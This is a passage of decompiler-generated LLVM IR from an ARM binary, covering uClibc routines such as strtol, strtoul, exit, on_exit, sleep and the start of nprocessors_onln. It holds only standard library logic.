  %v1_2a484.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2a47c

dec_label_pc_2a464:                               ; preds = %dec_label_pc_2a3e4
  %v0_2a464 = call i32 @__GI___errno_location()
  store i32 %v0_2a464, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r4.global-to-local, align 4
  %v2_2a46c = inttoptr i32 %v0_2a464 to i32*
  store i32 22, i32* %v2_2a46c, align 4
  %v0_2a470 = call i32 @__GI___errno_location()
  %v0_2a474 = load i32, i32* %r4.global-to-local, align 4
  %v2_2a474 = inttoptr i32 %v0_2a470 to i32*
  store i32 %v0_2a474, i32* %v2_2a474, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2a47c

dec_label_pc_2a47c:                               ; preds = %bb27, %.thread4, %dec_label_pc_2a464
  %v1_2a484 = phi i32 [ %v1_2a484.pre, %.thread4 ], [ %v1_2a458, %bb27 ], [ -1, %dec_label_pc_2a464 ]
  store i32 %v3_2a3ac, i32* @r4, align 4
  store i32 %v6_2a3ac, i32* @r5, align 4
  ret i32 %v1_2a484

; uselistorder directives
  uselistorder i1 %v7_2a3f4, { 1, 0 }
  uselistorder i1 %v7_2a3cc, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 2, 3, 1, 5 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -36228), { 1, 0, 2 }
  uselistorder i32 63, { 1, 0 }
  uselistorder i32 62, { 2, 0, 1 }
  uselistorder i32 %arg2, { 3, 4, 0, 1, 6, 5, 2, 7 }
  uselistorder label %dec_label_pc_2a47c, { 2, 1, 0 }
  uselistorder label %bb26, { 4, 3, 0, 1, 2 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_2a4a0 = call i32 @strtol()
  ret i32 %v0_2a4a0
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_2a4bc = call i32 @_stdlib_strto_l()
  ret i32 %v0_2a4bc
}

define i32 @strtoul(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 0, i32* @r3, align 4
  %v0_2a4d8 = call i32 @_stdlib_strto_l()
  ret i32 %v0_2a4d8

; uselistorder directives
  uselistorder i32 ()* @_stdlib_strto_l, { 1, 0 }
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %v0_2a4fc = load i32, i32* @r1, align 4
  store i32 %v0_2a4fc, i32* %fp.global-to-local, align 4
  %v0_2a500 = load i32, i32* @r2, align 4
  store i32 %v0_2a500, i32* %r5.global-to-local, align 4
  %v0_2a504 = load i32, i32* @r0, align 4
  store i32 %v0_2a504, i32* %r4.global-to-local, align 4
  %v0_2a508 = load i32, i32* @r3, align 4
  br label %dec_label_pc_2a514

dec_label_pc_2a510:                               ; preds = %dec_label_pc_2a514
  %v1_2a510 = add i32 %v0_2a54c, 1
  store i32 %v1_2a510, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_2a514

dec_label_pc_2a514:                               ; preds = %entry, %dec_label_pc_2a510
  %v0_2a54c = phi i32 [ %v0_2a504, %entry ], [ %v1_2a510, %dec_label_pc_2a510 ]
  %v1_2a514 = inttoptr i32 %v0_2a54c to i8*
  %v2_2a514 = load i8, i8* %v1_2a514, align 1
  %v3_2a514 = zext i8 %v2_2a514 to i32
  %v4_2a518 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 20828) to i32*), align 4
  %v2_2a51c = mul nuw nsw i32 %v3_2a514, 2
  %v2_2a520 = add i32 %v2_2a51c, %v4_2a518
  %v3_2a520 = inttoptr i32 %v2_2a520 to i16*
  %v4_2a520 = load i16, i16* %v3_2a520, align 2
  %v1_2a524 = and i16 %v4_2a520, 32
  %v2_2a524 = icmp eq i16 %v1_2a524, 0
  br i1 %v2_2a524, label %dec_label_pc_2a52c, label %dec_label_pc_2a510

dec_label_pc_2a52c:                               ; preds = %dec_label_pc_2a514
  %v7_2a52c = icmp eq i8 %v2_2a514, 43
  br i1 %v7_2a52c, label %dec_label_pc_2a54c, label %dec_label_pc_2a534

dec_label_pc_2a534:                               ; preds = %dec_label_pc_2a52c
  %v7_2a534 = icmp eq i8 %v2_2a514, 45
  br i1 %v7_2a534, label %dec_label_pc_2a54c, label %bb

bb:                                               ; preds = %dec_label_pc_2a534
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_2a550

dec_label_pc_2a54c:                               ; preds = %dec_label_pc_2a52c, %dec_label_pc_2a534
  %storemerge47 = phi i32 [ 1, %dec_label_pc_2a534 ], [ 0, %dec_label_pc_2a52c ]
  store i32 %storemerge47, i32* %r7.global-to-local, align 4
  %v1_2a54c = add i32 %v0_2a54c, 1
  store i32 %v1_2a54c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_2a550

dec_label_pc_2a550:                               ; preds = %bb, %dec_label_pc_2a54c
  %v0_2a570 = phi i32 [ %v0_2a54c, %bb ], [ %v1_2a54c, %dec_label_pc_2a54c ]
  %v1_2a550 = and i32 %v0_2a500, -17
  %v3_2a550 = icmp eq i32 %v1_2a550, 0
  br i1 %v3_2a550, label %dec_label_pc_2a55c, label %bb60

bb60:                                             ; preds = %dec_label_pc_2a550
  br label %bb64

dec_label_pc_2a55c:                               ; preds = %dec_label_pc_2a550
  %v1_2a55c = inttoptr i32 %v0_2a570 to i8*
  %v2_2a55c = load i8, i8* %v1_2a55c, align 1
  %v7_2a560 = icmp eq i8 %v2_2a55c, 48
  %v1_2a564 = add i32 %v0_2a500, 10
  store i32 %v1_2a564, i32* %r5.global-to-local, align 4
  br i1 %v7_2a560, label %dec_label_pc_2a570, label %bb61

bb61:                                             ; preds = %dec_label_pc_2a55c
  br label %.thread8

dec_label_pc_2a570:                               ; preds = %dec_label_pc_2a55c
  %v1_2a570 = add i32 %v0_2a570, 1
  %v2_2a570 = inttoptr i32 %v1_2a570 to i8*
  %v3_2a570 = load i8, i8* %v2_2a570, align 1
  %v4_2a570 = zext i8 %v3_2a570 to i32
  store i32 %v1_2a570, i32* %r4.global-to-local, align 4
  %v1_2a574 = or i32 %v4_2a570, 32
  %v7_2a578 = icmp eq i32 %v1_2a574, 120
  %v1_2a57c = add i32 %v0_2a500, 8
  store i32 %v1_2a57c, i32* %r5.global-to-local, align 4
  br i1 %v7_2a578, label %bb62, label %.thread8

bb62:                                             ; preds = %dec_label_pc_2a570
  %v3_2a588 = mul i32 %v1_2a57c, 2
  store i32 %v3_2a588, i32* %r5.global-to-local, align 4
  %v2_2a58c = add i32 %v0_2a570, 2
  store i32 %v2_2a58c, i32* %r4.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_2a570, %bb61, %bb62
  %v1_2a65830 = phi i32 [ %v0_2a504, %bb61 ], [ %v1_2a570, %bb62 ], [ %v1_2a570, %dec_label_pc_2a570 ]
  %v0_2a5dc21 = phi i32 [ %v0_2a570, %bb61 ], [ %v2_2a58c, %bb62 ], [ %v1_2a570, %dec_label_pc_2a570 ]
  %v0_2a590 = phi i32 [ %v1_2a564, %bb61 ], [ %v3_2a588, %bb62 ], [ %v1_2a57c, %dec_label_pc_2a570 ]
  %v5_2a594 = icmp slt i32 %v0_2a590, 16
  br i1 %v5_2a594, label %bb64, label %bb63

bb63:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %bb60, %.thread8, %bb63
  %v1_2a65829 = phi i32 [ %v0_2a504, %bb60 ], [ %v1_2a65830, %.thread8 ], [ %v1_2a65830, %bb63 ]
  %v0_2a5dc20 = phi i32 [ %v0_2a570, %bb60 ], [ %v0_2a5dc21, %.thread8 ], [ %v0_2a5dc21, %bb63 ]
  %v0_2a5bc = phi i32 [ %v0_2a500, %bb60 ], [ %v0_2a590, %.thread8 ], [ 16, %bb63 ]
  %v1_2a598 = add i32 %v0_2a5bc, -2
  %tmp = icmp ugt i32 %v1_2a598, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_2a5a8

.thread:                                          ; preds = %bb64
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_2a654

dec_label_pc_2a5a8:                               ; preds = %bb64
  %v2_2a5b0 = udiv i32 -1, %v0_2a5bc
  %v3_2a5b0 = urem i32 -1, %v0_2a5bc
  %v1_2a5c0 = urem i32 %v3_2a5b0, 256
  store i32 %v1_2a5c0, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  store i32 %v2_2a5b0, i32* %r8.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_2a5dc

dec_label_pc_2a5d8:                               ; preds = %bb71, %dec_label_pc_2a638
  %v0_2a5d8 = phi i32 [ %v1_2a61844, %bb71 ], [ %v0_2a5d8.pre, %dec_label_pc_2a638 ]
  br label %dec_label_pc_2a5dc

dec_label_pc_2a5dc:                               ; preds = %dec_label_pc_2a5a8, %dec_label_pc_2a5d8
  %v1_2a65827 = phi i32 [ %v1_2a65829, %dec_label_pc_2a5a8 ], [ %v0_2a5d8, %dec_label_pc_2a5d8 ]
  %v0_2a618 = phi i32 [ %v0_2a5dc20, %dec_label_pc_2a5a8 ], [ %v0_2a5d8, %dec_label_pc_2a5d8 ]
  %v1_2a5dc = inttoptr i32 %v0_2a618 to i8*
  %v2_2a5dc = load i8, i8* %v1_2a5dc, align 1
  %v3_2a5dc = zext i8 %v2_2a5dc to i32
  %v1_2a5e0 = add nsw i32 %v3_2a5dc, -48
  %v1_2a5e4 = urem i32 %v1_2a5e0, 256
  %v1_2a5ec = or i32 %v3_2a5dc, 32
  %tmp79 = icmp ult i32 %v1_2a5e4, 10
  br i1 %tmp79, label %bb66, label %dec_label_pc_2a5f4

dec_label_pc_2a5f4:                               ; preds = %dec_label_pc_2a5dc
  %tmp80 = icmp ugt i32 %v1_2a5ec, 96
  br i1 %tmp80, label %bb65, label %bb66

bb65:                                             ; preds = %dec_label_pc_2a5f4
  %v1_2a5f8 = add nsw i32 %v1_2a5ec, -87
  %v5_2a600 = urem i32 %v1_2a5f8, 256
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_2a5dc, %dec_label_pc_2a5f4, %bb65
  %v3_2a630 = phi i32 [ %v1_2a5e4, %dec_label_pc_2a5dc ], [ 40, %dec_label_pc_2a5f4 ], [ %v5_2a600, %bb65 ]
  %v1_2a604 = load i32, i32* %r5.global-to-local, align 4
  %v6_2a608 = icmp slt i32 %v3_2a630, %v1_2a604
  br i1 %v6_2a608, label %dec_label_pc_2a60c, label %dec_label_pc_2a654.loopexit

dec_label_pc_2a60c:                               ; preds = %bb66
  %v0_2a60c = load i32, i32* @ip, align 4
  %v1_2a60c = load i32, i32* %r8.global-to-local, align 4
  %v9_2a60c = icmp eq i32 %v0_2a60c, %v1_2a60c
  br i1 %v9_2a60c, label %.thread39, label %bb67

.thread39:                                        ; preds = %dec_label_pc_2a60c
  %v1_2a61840 = add i32 %v0_2a618, 1
  store i32 %v1_2a61840, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_2a620

bb67:                                             ; preds = %dec_label_pc_2a60c
  %v3_2a60c = icmp ult i32 %v0_2a60c, %v1_2a60c
  %v1_2a618 = add i32 %v0_2a618, 1
  store i32 %v1_2a618, i32* %r4.global-to-local, align 4
  br i1 %v3_2a60c, label %dec_label_pc_2a620, label %dec_label_pc_2a638

dec_label_pc_2a620:                               ; preds = %bb67, %.thread39
  %v1_2a61844 = phi i32 [ %v1_2a61840, %.thread39 ], [ %v1_2a618, %bb67 ]
  %v4_2a6282443 = phi i32 [ 1, %.thread39 ], [ 0, %bb67 ]
  %v1_2a620 = load i32, i32* %sl.global-to-local, align 4
  %v3_2a620 = icmp uge i32 %v3_2a630, %v1_2a620
  %v9_2a620 = icmp eq i32 %v3_2a630, %v1_2a620
  %v2_2a624 = xor i1 %v3_2a620, true
  %v3_2a624 = or i1 %v9_2a620, %v2_2a624
  br i1 %v3_2a624, label %bb68, label %bb69

bb68:                                             ; preds = %dec_label_pc_2a620
  br label %bb69

bb69:                                             ; preds = %dec_label_pc_2a620, %bb68
  %v4_2a628 = phi i32 [ %v4_2a6282443, %dec_label_pc_2a620 ], [ 0, %bb68 ]
  %v2_2a628 = xor i1 %v9_2a620, true
  %v3_2a628 = and i1 %v3_2a620, %v2_2a628
  br i1 %v3_2a628, label %bb70, label %thread-pre-split

bb70:                                             ; preds = %bb69
  %v5_2a628 = urem i32 %v4_2a628, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb69, %bb70
  %v0_2a62c = phi i32 [ %v5_2a628, %bb70 ], [ %v4_2a628, %bb69 ]
  %v2_2a62c = icmp eq i32 %v0_2a62c, 0
  br i1 %v2_2a62c, label %bb71, label %dec_label_pc_2a638

bb71:                                             ; preds = %thread-pre-split
  %v4_2a630 = mul i32 %v0_2a60c, %v1_2a604
  %v5_2a630 = add i32 %v4_2a630, %v3_2a630
  store i32 %v5_2a630, i32* @ip, align 4
  br label %dec_label_pc_2a5d8

dec_label_pc_2a638:                               ; preds = %bb67, %thread-pre-split
  %v0_2a638 = call i32 @__GI___errno_location()
  %v0_2a640 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_2a640, i32* @ip, align 4
  %v0_2a644 = load i32, i32* %r7.global-to-local, align 4
  %v2_2a644 = and i32 %v0_2a644, %v0_2a508
  store i32 %v2_2a644, i32* %r7.global-to-local, align 4
  %v2_2a64c = inttoptr i32 %v0_2a638 to i32*
  store i32 34, i32* %v2_2a64c, align 4
  %v0_2a5d8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_2a5d8

dec_label_pc_2a654.loopexit:                      ; preds = %bb66
  %v0_2a654.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_2a654

dec_label_pc_2a654:                               ; preds = %.thread, %dec_label_pc_2a654.loopexit
  %v1_2a658 = phi i32 [ %v1_2a65827, %dec_label_pc_2a654.loopexit ], [ %v1_2a65829, %.thread ]
  %v2_2a658 = phi i32 [ %v0_2a654.pre, %dec_label_pc_2a654.loopexit ], [ %v0_2a4fc, %.thread ]
  %v2_2a654 = icmp eq i32 %v2_2a658, 0
  br i1 %v2_2a654, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_2a654
  %v3_2a658 = inttoptr i32 %v2_2a658 to i32*
  store i32 %v1_2a658, i32* %v3_2a658, align 4
  br label %bb73

bb73:                                             ; preds = %dec_label_pc_2a654, %bb72
  %v0_2a660 = load i32, i32* %r7.global-to-local, align 4
  %v2_2a660 = icmp eq i32 %v0_2a660, 0
  %. = select i1 %v2_2a660, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r4.global-to-local, align 4
  %v2_2a66c = icmp eq i32 %v0_2a508, 0
  %v0_2a690.pre.pre = load i32, i32* @ip, align 4
  br i1 %v2_2a66c, label %dec_label_pc_2a688, label %bb76

bb76:                                             ; preds = %bb73
  %tmp81 = icmp ugt i32 %v0_2a690.pre.pre, %.
  br i1 %tmp81, label %dec_label_pc_2a678, label %dec_label_pc_2a688

dec_label_pc_2a678:                               ; preds = %bb76
  %v0_2a678 = call i32 @__GI___errno_location()
  %v2_2a680 = inttoptr i32 %v0_2a678 to i32*
  store i32 34, i32* %v2_2a680, align 4
  %v0_2a684 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_2a684, i32* @ip, align 4
  %v0_2a688.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_2a688

dec_label_pc_2a688:                               ; preds = %bb76, %bb73, %dec_label_pc_2a678
  %v0_2a690.pre = phi i32 [ %v0_2a690.pre.pre, %bb76 ], [ %v0_2a684, %dec_label_pc_2a678 ], [ %v0_2a690.pre.pre, %bb73 ]
  %v0_2a688 = phi i32 [ %v0_2a660, %bb76 ], [ %v0_2a688.pre, %dec_label_pc_2a678 ], [ %v0_2a660, %bb73 ]
  %v2_2a688 = icmp eq i32 %v0_2a688, 0
  br i1 %v2_2a688, label %dec_label_pc_2a688._crit_edge, label %bb77

bb77:                                             ; preds = %dec_label_pc_2a688
  %v2_2a68c = sub i32 0, %v0_2a690.pre
  store i32 %v2_2a68c, i32* @ip, align 4
  br label %dec_label_pc_2a688._crit_edge

dec_label_pc_2a688._crit_edge:                    ; preds = %dec_label_pc_2a688, %bb77
  %v0_2a690 = phi i32 [ %v2_2a68c, %bb77 ], [ %v0_2a690.pre, %dec_label_pc_2a688 ]
  ret i32 %v0_2a690

; uselistorder directives
  uselistorder i32 %v0_2a690.pre, { 1, 0 }
  uselistorder i32 %v0_2a690.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_2a628, { 1, 0 }
  uselistorder i1 %v3_2a620, { 1, 0 }
  uselistorder i32 %v1_2a620, { 1, 0 }
  uselistorder i32 %v1_2a5ec, { 1, 0 }
  uselistorder i32 %v1_2a5e4, { 1, 0 }
  uselistorder i32 %v0_2a618, { 1, 0, 2 }
  uselistorder i32 %v0_2a5d8, { 1, 0 }
  uselistorder i32 %v3_2a588, { 1, 0 }
  uselistorder i32 %v1_2a57c, { 1, 0, 2 }
  uselistorder i32 %v0_2a570, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_2a54c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_2a508, { 1, 0 }
  uselistorder i32 %v0_2a504, { 1, 0, 2, 3 }
  uselistorder i32 %v0_2a500, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 4, 2, 1, 3, 0, 5 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9 }
  uselistorder i32 -17, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_2a688._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_2a688, { 2, 0, 1 }
  uselistorder label %bb73, { 1, 0 }
  uselistorder label %dec_label_pc_2a654, { 1, 0 }
  uselistorder label %dec_label_pc_2a638, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb69, { 1, 0 }
  uselistorder label %bb66, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2a5dc, { 1, 0 }
  uselistorder label %dec_label_pc_2a5d8, { 1, 0 }
  uselistorder label %bb64, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2a550, { 1, 0 }
  uselistorder label %dec_label_pc_2a54c, { 1, 0 }
  uselistorder label %dec_label_pc_2a514, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r5, align 4
  %v4_2a6b4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 208) to i32*), align 4
  store i32 %v4_2a6b4, i32* @r4, align 4
  %v2_2a6bc = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r6, align 4
  %v4_2a6d4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 164) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_2a6d4)
  %v0_2a6e8 = load i32, i32* @r5, align 4
  %v2_2a6e8 = add i32 %v0_2a6e8, 36
  %v3_2a6e8 = inttoptr i32 %v2_2a6e8 to i32*
  %v4_2a6e8 = load i32, i32* %v3_2a6e8, align 4
  call void @__pseudo_branch(i32 %v4_2a6e8)
  %v0_2a6f8 = load i32, i32* @r5, align 4
  %v2_2a6f8 = add i32 %v0_2a6f8, 55680
  %v3_2a6f8 = inttoptr i32 %v2_2a6f8 to i32*
  %v4_2a6f8 = load i32, i32* %v3_2a6f8, align 4
  %v2_2a6fc = icmp eq i32 %v4_2a6f8, 0
  br i1 %v2_2a6fc, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v2_2a708 = xor i1 %v2_2a6fc, true
  call void @__pseudo_cond_branch(i1 %v2_2a708, i32 %v4_2a6f8)
  store i32 %v2_2a6bc, i32* @r0, align 4
  %v0_2a718 = load i32, i32* @r5, align 4
  %v2_2a718 = add i32 %v0_2a718, 76
  %v3_2a718 = inttoptr i32 %v2_2a718 to i32*
  %v4_2a718 = load i32, i32* %v3_2a718, align 4
  call void @__pseudo_branch(i32 %v4_2a718)
  %v0_2a724 = call i32 @__GI___uClibc_fini()
  %v0_2a72c = load i32, i32* @r5, align 4
  %v2_2a72c = add i32 %v0_2a72c, -132784
  %v9_2a72c = icmp eq i32 %v2_2a72c, 0
  br i1 %v9_2a72c, label %bb9, label %bb8

bb8:                                              ; preds = %.thread
  br label %bb9

bb9:                                              ; preds = %.thread, %bb8
  %v2_2a734 = xor i1 %v9_2a72c, true
  call void @__pseudo_cond_branch(i1 %v2_2a734, i32 %v2_2a72c)
  %v0_2a738 = load i32, i32* @r6, align 4
  %v1_2a73c = call i32 @__GI__exit(i32 %v0_2a738)
  %v0_2a740 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_2a740, label %bb10, label %.thread6

bb10:                                             ; preds = %bb9
  %v1_2a740 = load i32, i32* @r1, align 4
  %v2_2a740 = inttoptr i32 %v1_2a740 to i64*
  %v3_2a740 = load i64, i64* %v2_2a740, align 4
  %v5_2a740 = trunc i64 %v3_2a740 to i32
  %v6_2a740 = udiv i64 %v3_2a740, 4294967296
  %v7_2a740 = trunc i64 %v6_2a740 to i32
  store i32 %v7_2a740, i32* @sl, align 4
  store i32 %v5_2a740, i32* @fp, align 4
  %v2_2a744 = inttoptr i32 %v1_2a73c to i64*
  %v3_2a744 = load i64, i64* %v2_2a744, align 4
  %v5_2a744 = trunc i64 %v3_2a744 to i32
  store i32 %v5_2a744, i32* @r1, align 4
  br label %.thread6

.thread6:                                         ; preds = %bb9, %bb10
  %v4_2a758 = phi i32 [ %v1_2a73c, %bb9 ], [ 0, %bb10 ]
  ret i32 %v4_2a758

; uselistorder directives
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @on_exit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  %v0_2a770 = call i32 @__new_exitfn()
  store i32 %v0_2a770, i32* %r0.global-to-local, align 4
  %v2_2a774 = icmp eq i32 %v0_2a770, 0
  br i1 %v2_2a774, label %bb, label %.thread4

.thread4:                                         ; preds = %entry
  %v3_2a77c = inttoptr i32 %v0_2a770 to i32*
  store i32 2, i32* %v3_2a77c, align 4
  %v1_2a780 = load i32, i32* @r4, align 4
  %v2_2a780 = load i32, i32* %r0.global-to-local, align 4
  %v3_2a780 = add i32 %v2_2a780, 4
  %v4_2a780 = inttoptr i32 %v3_2a780 to i32*
  store i32 %v1_2a780, i32* %v4_2a780, align 4
  %v1_2a784 = load i32, i32* @r5, align 4
  %v2_2a784 = load i32, i32* %r0.global-to-local, align 4
  %v3_2a784 = add i32 %v2_2a784, 8
  %v4_2a784 = inttoptr i32 %v3_2a784 to i32*
  store i32 %v1_2a784, i32* %v4_2a784, align 4
  br label %bb

bb:                                               ; preds = %entry, %.thread4
  %storemerge = phi i32 [ 0, %.thread4 ], [ -1, %entry ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_2a79c = load i32, i32* @r4, align 4
  %v6_2a79c = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @ip, align 4
  %v2_2a7a0 = icmp eq i32 %arg1, 0
  store i32 0, i32* @r4, align 4
  br i1 %v2_2a7a0, label %dec_label_pc_2a834, label %dec_label_pc_2a7b0

dec_label_pc_2a7b0:                               ; preds = %entry
  %v2_2a7c0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 65536, i32* %stack_var_-24, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v4_2a7d4 = call i32 @__GI_sigaction(i32 17, i32* null, i32 %v2_2a7c0)
  %v3_2a7d8 = load i32, i32* %stack_var_-44, align 4
  %v7_2a7dc = icmp eq i32 %v3_2a7d8, 1
  br i1 %v7_2a7dc, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_2a7b0
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_2a7b0, %bb
  store i32 ptrtoint (i32* @global_var_2a7f0.1838 to i32), i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_2a7dc, i32 ptrtoint (i32* @global_var_23580.1559 to i32))
  %v2_2a7f0 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_2a7f0, i32* @r1, align 4
  %v1_2a7f8 = call i32 @nanosleep(i32 %v2_2a7f0)
  %v2_2a7fc = icmp eq i32 %v1_2a7f8, 0
  br i1 %v2_2a7fc, label %bb19, label %bb18

bb18:                                             ; preds = %.thread2
  %v3_2a810 = load i32, i32* %stack_var_-16, align 4
  br label %bb19

bb19:                                             ; preds = %.thread2, %bb18
  %storemerge = phi i32 [ %v3_2a810, %bb18 ], [ 0, %.thread2 ]
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v3_2a820 = load i32, i32* %stack_var_-24, align 4
  %v1_2a824 = and i32 %v3_2a820, 65536
  %v2_2a824 = icmp eq i32 %v1_2a824, 0
  br i1 %v2_2a824, label %bb20, label %.thread6

bb20:                                             ; preds = %bb19
  br label %.thread6

.thread6:                                         ; preds = %bb19, %bb20
  call void @__pseudo_cond_branch(i1 %v2_2a824, i32 ptrtoint (i32* @global_var_23580.1559 to i32))
  %v0_2a834.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_2a834

dec_label_pc_2a834:                               ; preds = %entry, %.thread6
  %v0_2a834 = phi i32 [ %v0_2a834.pre, %.thread6 ], [ 0, %entry ]
  store i32 %v3_2a79c, i32* @r4, align 4
  store i32 %v6_2a79c, i32* @lr, align 4
  ret i32 %v0_2a834

; uselistorder directives
  uselistorder i32 %v2_2a7f0, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32 (i32, i32*, i32)* @__GI_sigaction, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_2a834, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @nprocessors_onln() local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -36188), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_2a868 = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -36188))
  store i32 %v1_2a868, i32* @r6, align 4
  %v2_2a86c = icmp eq i32 %v1_2a868, 0
  br i1 %v2_2a86c, label %dec_label_pc_2a8ec, label %dec_label_pc_2a874

dec_label_pc_2a874:                               ; preds = %entry
  store i32 20828, i32* @sl, align 4
  %v0_2a87c = load i32, i32* @r4, align 4
  %v2_2a87c = add i32 %v0_2a87c, -36176
  store i32 %v2_2a87c, i32* @r8, align 4
  %v2_2a880 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_2a880, i32* @r7, align 4
  br label %bb18

dec_label_pc_2a888:                               ; preds = %bb18
  %v3_2a888 = load i32, i32* %stack_var_-36, align 4
  %v1_2a88c = inttoptr i32 %v3_2a888 to i32*
  %v2_2a88c = load i32, i32* %v1_2a88c, align 4
  %v1_2a890 = inttoptr i32 %v2_2a88c to i8*
  %v2_2a890 = load i8, i8* %v1_2a890, align 1
  %v7_2a894 = icmp eq i8 %v2_2a890, 99
  br i1 %v7_2a894, label %dec_label_pc_2a89c, label %.backedge3

dec_label_pc_2a89c:                               ; preds = %dec_label_pc_2a888
  %v1_2a89c = add i32 %v2_2a88c, 1
  %v2_2a89c = inttoptr i32 %v1_2a89c to i8*
  %v3_2a89c = load i8, i8* %v2_2a89c, align 1
  %v7_2a8a0 = icmp eq i8 %v3_2a89c, 112
  br i1 %v7_2a8a0, label %dec_label_pc_2a8a8, label %.backedge3

dec_label_pc_2a8a8:                               ; preds = %dec_label_pc_2a89c
  %v1_2a8a8 = add i32 %v2_2a88c, 2
